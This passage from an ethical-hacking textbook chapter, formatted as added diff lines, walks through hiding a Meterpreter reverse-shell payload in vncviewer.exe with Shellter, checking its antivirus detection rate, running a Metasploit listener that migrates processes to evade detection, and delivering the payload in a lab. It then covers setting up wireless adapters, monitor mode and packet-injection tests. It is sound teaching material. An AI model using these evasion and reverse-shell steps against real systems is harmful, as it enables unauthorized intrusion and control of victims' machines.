+<li>Payload by index: <code>1 – Meterpreter_Reverse_TCP</code>.</li>
+<li>Set <code>LHOST</code> as the IP address of your Kali Linux machine.</li>
+<li>Set <code>LPORT</code> as the listening port on Kali Linux.</li>
+</ul></li>
+</ol>
+<p>The following screenshot shows the expected configurations:</p>
+<img src="../media/file340.png" width="495" height="419"/>
+<p>Once the custom payload has been successfully complied, the following window will appear:</p>
+<img src="../media/file341.png" width="546" height="373"/>
+<ol>
+<li>Next, go to <a href="https://www.virustotal.com/">https://www.virustotal.com/</a> and upload the encoded <code>vncviewer.exe</code> file to determine its threat rating, as shown below:</li>
+</ol>
+<img src="../media/file342.png" width="1134" height="621"/>
+<p>As shown in the preceding screenshot, the threat detection rating is lower than those payloads that were generated by MSFvenom.</p>
+<ol>
+<li>Next, use the following commands to setup a Meterpreter listener using Metasploit to capture to reverse shell from the targeted system when it’s executed:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ msfconsole
+msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST 172.30.1.50
+msf6 exploit(multi/handler) &gt; set LPORT 5678
+msf6 exploit(multi/handler) &gt; set AutoRunScript post/windows/manage/migrate
+msf6 exploit(multi/handler) &gt; exploit</code></pre>
+</div>
+<p>The following screenshot shows the execution of the preceding commands:</p>
+<img src="../media/file343.png" width="1183" height="378"/>
+<p>The following is a breakdown of the preceding sequence of commands:</p>
+<ul>
+<li>The <code>windows/meterpreter/reverse_tcp</code> payload ensures when a connection is detected, Metasploit will send this payload to the targeted system, which will execute within memory and create a reverse shell back to the Kali Linux machine.</li>
+<li>The <code>LHOST</code> and <code>LPORT</code> parameters are used to set the local IP address and listening port on Kali Linux.</li>
+<li>The <code>AutoRunScript post/windows/manage/migrate</code> command ensures that once a connection has been established from the victim system to Kali Linux, Metasploit will automatically migrate the process on the targeted system to another process to reduce detection.</li>
+<li>The <code>exploit</code> command is used to execute a payload or exploit module within Metasploit.</li>
+</ul>
+<ol>
+<li>Next, let's deliver our custom payload to a Windows-based machine on such as Metasploitable 3 on the <code>172.30.1.0/24</code> network within our virtual lab environment. On Kali Linux, open a new <strong>Terminal</strong> (#2) and use the following commands to start a Python3 web server:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ python3 -m http.server 8000</code></pre>
+</div>
+<p>The Python3 web server will enable us to download files from the Kali Linux machine onto other systems within our lab environment.</p>
+<ol>
+<li>Next, power-on the <strong>Metasploitable 3</strong> virtual machine and login with username: <code>Administrator</code> and password: <code>vagrant</code> to login to the desktop.</li>
+<li>Within <strong>Metasploitable 3</strong>, open the web browser and go to <code>http://172.30.1.50:8000/vncviewer.exe</code> to download and save the payload.</li>
+<li>Next, execute the <code>vncviewer.exe</code> file on <strong>Metasploitable 3</strong> and notice the reverse shell is captured on <strong>Terminal #1</strong> on <strong>Kali Linux</strong>, as shown below:</li>
+</ol>
+<img src="../media/file344.png" width="1697" height="667"/>
+<p>As shown in the preceding screenshot, the Metasploit listener module captured a reverse connection from <code>172.30.1.48</code>, then delivered an additional payload to establish a Meterpreter shell and migrate the running process ID on the victim system. Additionally, using the <code>sysinfo</code> command on Meterpreter enables us to obtain system information about the compromised system.</p>
+<blockquote>
+<p>Once a Meterpreter shell has been obtained, use the <code>help</code> command to view a list of commands for performing actions and collecting information from the compromised machine.</p>
+</blockquote>
+<p>Not all Windows-based executables will work with Shellter. When working with Shellter, it’s important to ensure the PE file that’s encoded with shellcode from Shellter executes long enough on the targeted system for the staged payload to be delivered from Kali Linux to the target.</p>
+<ol>
+<li>Lastly, use the <code>getuid</code> command within Meterpreter to determine the user account that’s running our payload, as shown below:</li>
+</ol>
+<img src="../media/file345.png" width="726" height="123"/>
+<p>As shown in the preceding screenshot, the payload is running as the Administrator user account on the targeted system.Having completed this section, you have learned how to create, encode, and deliver payloads on a target system host. This section has provided you with an introduction into the weaponization and delivery phases of the Cyber Kill Chain. In addition, you have also learned how to identify whether a payload has a high threat detection rating and discover common techniques which can be used to reduce detection by antimalware. In the next section, you will learn how to configure wireless adapters to monitor nearby traffic on Wi-Fi networks.</p>
+</section>
+</section>
+<section id="working-with-wireless-adapters" class="level2" data-number="9.6">
+<h2 data-number="9.6">Working with wireless adapters</h2>
+<p>As an aspiring ethical hacking and penetration tester, you may be assigned to perform wireless penetration testing techniques on a targeted network with the intent of identifying any security vulnerabilities and assessing the attack surface to better understand how an adversary may be able to compromise the wireless network of an organization and gain unauthorized access.While many ethical hackers and penetration testers prefer to directly install Kali Linux on the local storage drive on their laptops for improve mobility and direct access to the hardware resources, this deployment model isn’t always the best. For instance, the chipset within the wireless network adapter on a laptop may not support monitoring mode and packet injection.</p>
+<ul>
+<li>Therefore, it’s recommended to acquire a set of external wireless networks adapters that supports the following features:<br/>
+IEEE 802.11 standards such as 802.11a/b/g/n/ac.</li>
+<li>Operates on the 2.4 GHz and 5 GHz bands.</li>
+<li>Supports monitoring mode to identify wireless clients and access points.</li>
+<li>Support packet injects for performing wireless penetration testing.</li>
+</ul>
+<p>While there are many wireless network adapters available on popular e-commerce websites, the following are two wireless network adapters that are commonly used by penetration testers within the industry:</p>
+<ul>
+<li>Alfa AWUS036NHA - Wireless B/G/N USB Adapter (supports 2.4 GHz only)</li>
+<li>Alfa AWUS036ACH Long-Range Dual-Band AC1200 Wireless USB Adapter (supports 2.4 GHz and 5 GHz)</li>
+</ul>
+<blockquote>
+<p>Keep in mind, there are additional vendors that manufacture wireless network adapters that supports monitoring mode and packet injection. However, you’ll need to do additional research and make comparisons to determine which wireless network adapter is best suitable for you based on its availability, cost, features, form factor and interoperability with your system and Kali Linux.</p>
+</blockquote>
+<p>The following is an image of the Alfa AWUS036NHA wireless network adapter:</p>
+<img src="../media/file346.png" width="1840" height="1808"/>
+<p>As shown in the preceding image, the Alfa adapter includes a detachable antenna which enables penetration testers to connect with a more powerful antenna to capture wireless frames at a greater distance.The following image shows the Alfa AWUS036ACH wireless adapter:</p>
+<img src="../media/file347.png" width="2464" height="1840"/>
+<p>As shown in the preceding image, the Alfa AWUS036ACH model also support detachable antennas similar to the Alfa AWUS036NHA model.Using a wireless network adapter that supports the 2.4 GHz band will only be efficient for performing wireless penetration testing on wireless networks and access points that operates only on 2.4 GHz and not 5 GHz. As a penetration tester, it's important to always be prepared for each type of penetration test, such as ensuring you have the appropriate software and hardware tools within your arsenal. Imagine that you've arrived at the customer’s location to perform a wireless penetration test and you attach your wireless network adapter to Kali Linux, but it's unable to detect the targeted wireless network. While there are many reasons for not being able to detect the wireless network, one specific reason is that the targeted wireless network is operating on the 5 GHz band, while your wireless network adapter only supports 2.4 GHz. Hence, it’s important to properly plan for each penetration test before starting any technical work on the customer’s infrastructure.Over the next few sub-sections, you will learn how to connect the Alfa AWUS036NHA and AWUS036ACH wireless adapters to the Kali Linux virtual machine.</p>
+<section id="connecting-wireless-adapters-to-kali-linux" class="level3" data-number="9.6.1">
+<h3 data-number="9.6.1">Connecting wireless adapters to Kali Linux</h3>
+<p>In this section, you will learn how to properly attach a USB wireless network adapter such as the Alfa AWUS036NHA adapter to Kali Linux over Oracle VM VirtualBox. In this exercise, I’ll be using the Alfa AWUS036NHA wireless adapter as it doesn’t require additional drivers on Kali Linux.To get started with this exercise, please use the following instructions:</p>
+<ol>
+<li>Firstly, attach the Alfa AWUS036NHA wireless adapter onto your host system via an available USB port. I do not recommend connecting your wireless network adapter onto a USB hub, consider connecting the wireless adapter directly onto a USB port on your motherboard or laptop.</li>
+<li>Next, open the <strong>Oracle VM VirtualBox Manager</strong>, select the <strong>Kali Linux</strong> virtual machine and click on <strong>Settings</strong>, as shown below:</li>
+</ol>
+<img src="../media/file348.png" width="1006" height="667"/>
+<ol>
+<li>On the <strong>Settings</strong> menu, select the <strong>USB</strong> category and ensure the <strong>USB Controller</strong> mode is set to either USB 2.0 or USB 3.0 based on the type of physical USB ports on your host computer. Then, click on the <strong>USB+</strong> icon to select the wireless network adapter, as shown below:</li>
+</ol>
+<img src="../media/file349.png" width="683" height="488"/>
+<ol>
+<li>Next, the USB device menu will appear showing all connected USB devices on the host computer, including the connected Alfa AWUS036NHA wireless adapter. Simply, select the Alfa AWUS036NHA wireless adapter to insert it within the list of USB Devices, as shown below:</li>
+</ol>
+<img src="../media/file350.png" width="337" height="212"/>
+<p>As shown in the preceding screenshot, the wireless network adapter is labelled as ATHEROS UB91C. The device identification may vary on the chipset on the wireless adapter and the operating system.The following screenshot shows the wireless adapter is available within the USB Devices Filters list and it’s selected:</p>
+<img src="../media/file351.png" width="683" height="487"/>
+<ol>
+<li>Next, on the <strong>Setting</strong> window, click on <strong>OK</strong> to save the configurations.</li>
+<li>Next, power-on the <strong>Kali Linux</strong> virtual machine and login to the desktop.</li>
+<li>Next, the wireless network adapter may not logically be connected to Kali Linux, therefore right-click on the USB icon found on the Kali Linux virtual machine status bar found on the bottom-right, as shown below:</li>
+</ol>
+<img src="../media/file352.png" width="340" height="40"/>
+<p>After you’ve right-click on the USB icon, a list of available USB devices will appear. Simply, click on the wireless network adapter to attach it onto the virtual machine.</p>
+<ol>
+<li>On <strong>Kali Linux</strong>, open the <strong>Terminal</strong> and use the <code>ifconfig</code> command to verify the wireless network adapter is attached, as shown below:</li>
+</ol>
+<img src="../media/file353.png" width="1043" height="275"/>
+<p>As shown in the preceding screenshot, Kali Linux was able to detect the physical wireless network adapter and labelled the interface as <code>wlan0</code> without requiring any additional software drivers. Within Linux-based operating systems, physical Ethernet adapters are labelled as <code>eth</code> interfaces, while wireless adapters are labelled as <code>wlan</code> interfaces. The number after an interface’s name represents the <strong>interface identifier</strong> (<strong>ID</strong>) and the first interface usually begins with <code>0</code> such as <code>eth0</code> and <code>wlan0</code>.</p>
+<ol>
+<li>Next, use the <code>iwconfig</code> command to view specific details of the wireless adapter, as shown below:</li>
+</ol>
+<img src="../media/file354.png" width="1098" height="526"/>
+<ol>
+<li>As shown in the preceding screenshot, the <code>iwconfig</code> command enables us to view the current operating system mode of the wireless network adapter. Here, you can view the operating system mode, the transmitting power level (<strong>Tx-Power</strong>) and determine whether the wireless adapter is associated (connected) to a nearby access point or wireless router.</li>
+</ol>
+<p>Having completed this exercise, you have learnt how to successfully attach a wireless network adapter to Kali Linux. Furthermore, you have learned how the Alfa AWUS036NHA wireless network adapter functions seamlessly as a plug-and-play device. Next, you will learn how to connect a wireless network adapter that has an RTL8812AU chipset such as the Alfa AWUS036ACH wireless adapter.</p>
+</section>
+<section id="connecting-a-wireless-adapter-with-an-rtl8812au-chipset" class="level3" data-number="9.6.2">
+<h3 data-number="9.6.2">Connecting a wireless adapter with an RTL8812AU chipset</h3>
+<p>Various wireless network adapters has the RTL8812AU chipset and is not natively recognized/identified by Kali Linux when it’s connected. In this section, you will learn how to successfully setup and connect a wireless network adapter such as the Alfa AWUS036ACH wireless network adapter, which has an RTL8812AU chipset.To get started with this exercise, please use the following instructions:</p>
+<ol>
+<li>Firstly, connect the Alfa AWUS036ACH wireless network adapter onto your host system.</li>
+<li>Open <strong>Oracle VirtualBox Manager</strong>, select the <strong>Kali Linux</strong> virtual machine and click on <strong>Settings</strong>.</li>
+<li>Once the <strong>Settings</strong> menu appear, click on the <strong>USB</strong> category and ensure the USB Controller mode is either set to USB 2.0 or 3.0 which is based on the type of physical USB ports are supported on your host computer. Then, click on the <strong>USB+</strong> icon to open a pop-up menu which displays all USB connected devices, as shown below:</li>
+</ol>
+<img src="../media/file355.png" width="563" height="403"/>
+<ol>
+<li>Next, on the USB devices pop-up menu select the wireless network adapter which is labelled <strong>Realtek 802.11n NIC</strong>, as shown below:</li>
+</ol>
+<img src="../media/file356.png" width="394" height="262"/>
+<blockquote>
+<p>The device identification may vary on the chipset on the wireless adapter and the operating system.</p>
+</blockquote>
+<p>The following screenshot shows the wireless adapter is available within the <strong>USB Devices Filters</strong> list and it’s selected:</p>
+<img src="../media/file357.png" width="700" height="501"/>
+<ol>
+<li>Next, on the <strong>Setting</strong> window, click on <strong>OK</strong> to save the configurations.</li>
+<li>Next, power-on the <strong>Kali Linux</strong> virtual machine and login to the desktop.</li>
+<li>Next, the wireless network adapter may not logically be connected to Kali Linux, therefore right-click on the USB icon found on the Kali Linux virtual machine status bar on the bottom-right and select the newly connected wireless network adapter, as shown below:</li>
+</ol>
+<img src="../media/file358.png" width="427" height="335"/>
+<p>As shown in the preceding screenshot, the Alfa AWUS036ACH is identified as a Realtek 802.11n NIC device.</p>
+<ol>
+<li>Next, open the <strong>Terminal</strong> within Kali Linux and use the <code>lsusb</code> command to verify the chipset of the attached wireless adapter, as shown below:</li>
+</ol>
+<img src="../media/file359.png" width="1673" height="201"/>
+<p>As shown in the preceding screenshot, the Alfa AWUS036ACH wireless adapter has an RTL8812AU chipset. However, when using the <code>iwconfig</code> command, Kali Linux is unable to detect the wireless adapter as shown below:</p>
+<img src="../media/file360.png" width="584" height="368"/>
+<ol>
+<li>Next, use the following command to update the packages source lists file on Kali Linux:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo apt update</code></pre>
+</div>
+<ol>
+<li>Next, install the Realtek drivers for the RTL88XXAU chipset onto Kali Linux with Dynamic Kernel Module Support (DKMS) using the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo apt install realtek-rtl88xxau-dkms</code></pre>
+</div>
+<ol>
+<li>Next, use the following commands to download, compile and install the latest RTL8812AU drivers from the Aircrack-ng GitHub repository:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ git clone https://github.com/aircrack-ng/rtl8812au
+kali@kali:~$ cd rtl8812au
+kali@kali:~/rtl8812au$ sudo make
+kali@kali:~/rtl8812au$ sudo make install</code></pre>
+</div>
+<ol>
+<li>Next, reboot Kali Linux to ensure the newly installed drivers are effective.</li>
+<li>After rebooting Kali Linux, open the Terminal and use the iwconfig command to verify the Alfa AWUS036ACH wireless network adapter is being recognized on Kali Linux, as shown below:</li>
+</ol>
+<img src="../media/file361.png" width="1152" height="637"/>
+<p>As shown in the preceding screenshot, the wireless network adapter is now connected on to Kali Linux, which enables us to perform various types of wireless-based attacks on the 2.4 GHz and 5 GHz wireless frequencies. Wireless penetration testing will be covered later in this book.Having completed this section, you learnt how to connect a natively supported wireless network adapter onto Kali Linux via Oracle VirtualBox. In addition, you have also learnt how to install the necessary drivers that supports wireless network adapters with the RTL8812AU chipset. In the next section, you will learn about various operating modes of wireless network adapters and how they can be leverage for wireless penetration testing.</p>
+</section>
+</section>
+<section id="managing-and-monitoring-wireless-modes" class="level2" data-number="9.7">
+<h2 data-number="9.7">Managing and monitoring wireless modes</h2>
+<p>As an ethical hacker and penetration tester, it’s important to have a clear understanding of the various operating modes of a wireless network adapter. Let’s take a look at each operating mode for wireless network adapters:</p>
+<ul>
+<li>Managed – This is the default operating mode for all wireless network adapters. This mode enables a host device such as computer to connect to a nearby access point or wireless router. However, this mode does not enable ethical hackers and penetration tester to perform any type of wireless penetration testing techniques on a targeted wireless network.</li>
+<li>Monitor – This operating mode enables ethical hackers and penetration tester to scan for IEEE 802.11 wireless networks within the vicinity, capture wireless frames such as beacons from access points and probes from wireless clients, and enables you to perform packet inject attacks on a targeted wireless network.</li>
+<li>Master – This mode enables Linux-based operating systems to function as an access point or wireless router.</li>
+<li>Ad hoc – The ad-hoc mode enables the host system to directly connect to another host without the need for an intermediary device such as an access point or wireless router.</li>
+<li>Repeater – This mode allows a host device to simply capture a wireless signal and reproduce it to other clients with the intention to extend the range of a wireless network. Keep in mind, repeaters are typically used to extend wireless signal coverage over distance.</li>
+<li>Secondary – This mode enables a host to operate as a backup device for a master or repeater system.</li>
+</ul>
+<p>Now that you have an understanding of the various operating modes of wireless network adapters, let’s take a deeper dive into configuring monitoring mode and determine whether a wireless network adapter supports packet injection.</p>
+<section id="configuring-monitoring-mode" class="level3" data-number="9.7.1">
+<h3 data-number="9.7.1">Configuring monitoring mode</h3>
+<p>In this section, you will learn how to configure a wireless network adapter to operating in monitor mode using native tools within Kali Linux. For this exercise, we’ll be using the Alfa AWUS036NHA wireless network adapter.To get started with this exercise, please use the following instructions:</p>
+<ol>
+<li>Ensure the Alfa AWUS036NHA wireless network adapter is connected to your host machine and it’s attached to the <strong>Kali Linux</strong> virtual machine via <strong>Oracle VM VirtualBox Manager</strong>.</li>
+<li>Power-on the <strong>Kali Linux</strong> virtual machine. Open the <strong>Terminal</strong> and use the <code>iwconfig</code> command to verify whether the wireless network adapter is being detected by Kali Linux, as shown below:</li>
+</ol>
+<img src="../media/file362.png" width="1043" height="500"/>
+<p>As shown in the preceding screenshot, the wireless network adapter is identified as <code>wlan0</code> and is operating in <strong>Managed</strong> mode.</p>
+<ol>
+<li>Next, logically turn-down the wlan0 interface with the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo ifconfig wlan0 down</code></pre>
+</div>
+<blockquote>
+<p>After executing the preceding command, use the <code>ifconfig</code> command to verify whether <code>wlan0</code> is no longer shown in the output. If the <code>wlan0</code> interface is still present, execute the <code>sudo ifconfig wlan0 down</code> command again.</p>
+</blockquote>
+<ol>
+<li>Next, change the operating mode of <code>wlan0</code> to <strong>Monitor</strong> with the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo iwconfig wlan0 mode monitor</code></pre>
+</div>
+<p>The preceding command will automatically re-enable the <code>wlan0</code> interface.</p>
+<ol>
+<li>Next, use the <code>iwconfig</code> command to verify the <code>wlan0</code> interface is configured in <strong>Monitor</strong> mode, as shown below:</li>
+</ol>
+<img src="../media/file363.png" width="927" height="486"/>
+<ol>
+<li>To test whether the attached wireless network adapter supports packet injection, use the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo aireplay-ng -9 wlan0</code></pre>
+</div>
+<p>Aireplay-ng is a component of the Aircrack-ng suite of wireless security tools for wireless penetration testing. Using the <code>-9</code> syntax enables the interface/adapter to test for packet injection while it operates in monitor mode, as shown below:</p>
+<img src="../media/file364.png" width="1030" height="314"/>
+<blockquote>
+<p>To perform packet injection, the wireless network interface has to be in monitor mode.</p>
+</blockquote>
+<ol>
+<li>Lastly, to revert the interface to managed mode, use the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo ifconfig wlan0 down
+kali@kali:~$ sudo iwconfig wlan0 mode managed
+kali@kali:~$ sudo ifconfig wlan0 up</code></pre>
+</div>
+<p>The following screenshot verifies the wireless network adapter has been successfully reverted to Managed mode:</p>
+<img src="../media/file365.png" width="1034" height="497"/>
+<p>Having completed this exercise, you have learnt how enable monitor mode on a wireless network adapter using native tools within Kali Linux and testing whether packet injection is supported. Next, you will learn how to automate this process by using Aircrack-ng on Kali Linux.</p>
+</section>
+<section id="using-aircrack-ng-to-enable-monitor-mode" class="level3" data-number="9.7.2">
+<h3 data-number="9.7.2">Using Aircrack-ng to enable monitor mode</h3>
+<p>In this section, you will learn how to use Aircrack-ng, a suite of wireless security tools that’s commonly used by ethical hackers and penetration testers to enable monitor mode on wireless network adapters. For this exercise, we’ll be using the Alfa AWUS036NHA wireless network adapter.To get started with this exercise, please use the following instructions:</p>
+<ol>
+<li>Ensure the Alfa AWUS036NHA wireless network adapter is connected to your host computer and it’s attached to the <strong>Kali Linux</strong> virtual machine <strong>on Oracle VM VirtualBox Manager</strong>.</li>
+<li>Next, power-on the <strong>Kali Linux</strong> virtual machine and login.</li>
+<li>Next, open the <strong>Terminal</strong> within <strong>Kali Linux</strong> and use the <code>iwconfig</code> command to verify whether the Alfa AWUS036NHA wireless network adapter is detected, as shown below:</li>
+</ol>
+<img src="../media/file366.png" width="1045" height="504"/>
+<ol>
+<li>Next, use the following commands to identify and terminate any background processes that may prevent the wireless network adapter from operating in monitor mode:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo airmon-ng check kill</code></pre>
+</div>
+<p>The following screenshot shows Airmon-ng found potentially conflicting processes and terminated it:</p>
+<img src="../media/file367.png" width="581" height="264"/>
+<ol>
+<li>Next, enable monitor mode on the <code>wlan0</code> interface by using the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo airmon-ng start wlan0</code></pre>
+</div>
+<p>The following screenshot shows a new logically interface called <code>wlan0mon</code> was created as the monitor interface:</p>
+<img src="../media/file368.png" width="1259" height="297"/>
+<ol>
+<li>Use the <code>iwconfig</code> command to verify the operation status of the newly created monitor interface, as shown below:</li>
+</ol>
+<img src="../media/file369.png" width="1081" height="478"/>
+<ol>
+<li>Next, use Aircrack-ng to test whether packet inject is supported on <code>wlan0mon</code>, use the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo aireplay-ng -9 wlan0mon</code></pre>
+</div>
+<p>The following screenshot shows Aireplay-ng was able to verify that packet injection is supported on the interface:</p>
+<img src="../media/file370.png" width="1024" height="389"/>
+<ol>
+<li>Lastly, to revert the wireless interface from monitor to managed mode, use the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo airmon-ng stop wlan0mon</code></pre>
+</div>
+<p>The following screenshot shows that Airmon-ng disabled monitor mode on the interface:</p>
+<img src="../media/file371.png" width="1254" height="272"/>
+<ol>
+<li>Lastly, use the <code>iwconfig</code> command to verify the wireless interface is operating in managed mode, as shown below:</li>
+</ol>
+<img src="../media/file372.png" width="1026" height="501"/>
+<p>Having completed this section, you have learnt how to configure wireless network adapters to operate in monitor mode using both native and automated tools within Kali Linux. In addition, you have learned how to test whether a wireless network adapter supports packet injection.</p>
+</section>
+</section>
+<section id="summary-7" class="level2" data-number="9.8">
+<h2 data-number="9.8">Summary</h2>
+<p>Having completed this chapter, you have learnt about the importance of network penetration testing and how it helps organizations to improve their cyber defensive and strategies to prevent future cyber-attacks and threats. In addition, you have discovered how to setup and work with both bind and reverse shell between different systems over a network. Furthermore, you have exploited how to setup wireless network adapters for performing wireless penetration testing in later chapters.I trust that the knowledge presented in this chapter has provided you with valuable insights, supporting your path towards becoming an ethical hacker and penetration tester in the dynamic field of cybersecurity. May this newfound understanding empower you in your journey, allowing you to navigate the industry with confidence and make a significant impact. In the next chapter, <em>Performing Network Penetration Testing</em>, you will learn how to perform network penetration testing to identify security vulnerabilities on targeted systems and networks.</p>
+</section>
+<section id="further-reading-7" class="level2" data-number="9.9">
+<h2 data-number="9.9">Further Reading</h2>
+<ul>
+<li>To learn about Aircrack-ng, go to: <a href="https://www.aircrack-ng.org/doku.php?id=Main">https://www.aircrack-ng.org/doku.php?id=Main</a>.</li>
+</ul>
+</section>
+</section>
+</div>
+</div>
+</body>
+</html>
